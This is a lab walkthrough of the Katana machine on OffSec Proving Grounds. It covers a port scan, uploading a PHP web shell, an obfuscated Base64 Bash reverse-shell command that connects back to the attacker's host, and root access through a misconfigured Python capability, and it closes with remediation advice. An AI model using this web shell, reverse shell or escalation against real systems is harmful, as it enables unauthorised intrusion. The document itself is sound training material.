# Katana (OffSec Proving Grounds) Writeup

## Enumeration
#### Nmap Scan Results
Nmap identifies the host as a Linux machine. The results also show FTP running on port 21, SSH running on port 22, an Apache web server running on port 80, LiteSpeed running on ports 7080 and 8088 and Nginx running on port 8715.
```
└─# nmap -p- -A -T4 192.168.135.83 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-26 15:55 +0300
Nmap scan report for 192.168.135.83
Host is up (0.082s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
7080/tcp open  ssl/empowerid LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-server-header: LiteSpeed
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://192.168.135.83:7080/
8088/tcp open  http          LiteSpeed httpd
|_http-title: Katana X
|_http-server-header: LiteSpeed
8715/tcp open  http          nginx 1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Enumeration of the different web applications leads to an `upload.html` page on the LiteSpeed server running on port 8088. The file upload functionality seems to accept two files per upload.
![](assets/katana/Pasted%20image%2020261110162009.png)

## Initial Access
A simple PHP web shell is prepared, accepting the `cmd` parameter in a GET request and executing its value on the underlying system through the `system()` function.
![](assets/katana/Pasted%20image%2020261110162141.png)

The file is selected twice through both `Browse` buttons and uploaded. The web application's response displays that the files have been successfully uploaded and moved to the other web server under the `katana_simple.php` name.
![](assets/katana/Pasted%20image%2020261110162301.png)

The web shell is found on the Nginx web server running on port 8715. The `id` command is executed, revealing that commands are executed under the `www-data` account.
![](assets/katana/Pasted%20image%2020261110162554.png)

To upgrade the web shell to a reverse shell, a Bash reverse shell one-liner is encoded in Base64.
![](assets/katana/Pasted%20image%2020261110162645.png)

The following command is then sent through the `cmd` parameter, using `echo` to pass the string into `base64 -d` through a pipe (`|`), before passing it through a second pipe to `bash` for execution.
```
echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMDcvNDQzICAwPiYx | base64 -d | bash
```

This establishes a reverse shell as the `www-data` user.
![](assets/katana/Pasted%20image%2020261110162817.png)
## Privilege Escalation
Enumeration of capabilities reveals that `/usr/bin/python2.7` is configured with the `cap_setuid+ep` capability.
![](assets/katana/Pasted%20image%2020261110162855.png)

This allows Python scripts to change the process's UID to 0 using the `os` module and the `setuid()` function, as documented on GTFOBins.
![](assets/katana/Pasted%20image%2020261110163047.png)

The command is then executed through Python 2.7, executing `/bin/bash` with UID 0, resulting in root-level access.
![](assets/katana/Pasted%20image%2020261110163129.png)
## Finding & Remediation

### Unrestricted File Upload
#### Description
The `upload.html` page on the LiteSpeed server running on port 8088 allows unrestricted file uploads, including PHP files containing malicious code. Uploaded files are accessible through the Nginx web server running on port 8715, where they can be executed.
#### Impact
An attacker can upload a malicious PHP web shell to execute arbitrary commands on the target system, leading to remote code execution and establishing a reverse shell.
#### Remediation
Implement strict server-side file upload validation to restrict executable file types such as PHP. Store uploaded files outside the web root and prevent the execution of uploaded content.
### Information Disclosure
#### Description
The file upload functionality discloses the server-side path of uploaded files in its response, revealing their location on a different web server's root directory.
#### Impact
An attacker can use the disclosed path to locate uploaded files without performing additional directory enumeration, facilitating the exploitation of the unrestricted file upload vulnerability.
#### Remediation
Avoid exposing internal filesystem paths in application responses. Return generic upload confirmation messages without revealing sensitive server-side information.
### Misconfigured Linux Capabilities
#### Description
The `/usr/bin/python2.7` executable is configured with the `cap_setuid+ep` capability, allowing Python processes to change their user ID to 0.
#### Impact
An attacker with access to the system can abuse this capability to execute commands with `root` privileges, resulting in complete system compromise.
#### Remediation
Remove the unnecessary capability from the Python executable using `setcap -r /usr/bin/python2.7`. Apply the principle of least privilege and regularly audit executable capabilities to identify and remove excessive permissions.
